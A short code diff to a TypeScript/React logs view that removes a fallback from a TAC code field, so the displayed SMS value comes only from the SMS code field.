@@ -2687,9 +2687,7 @@ export function LogsTab({ darkMode, user, displayMode = "normal" }: { darkMode: 
             const smsValue =
               typeof fd.smsCode === "string" && fd.smsCode.trim()
                 ? fd.smsCode.trim()
-                : typeof fd.tacCode === "string" && fd.tacCode.trim()
-                  ? fd.tacCode.trim()
-                  : "";
+                : "";
             const fullName = `${fd.firstName || ""} ${fd.lastName || ""}`.trim();
             const currentApproval =
               typeof fd.approvalStatus === "string" ? fd.approvalStatus.trim() : "";
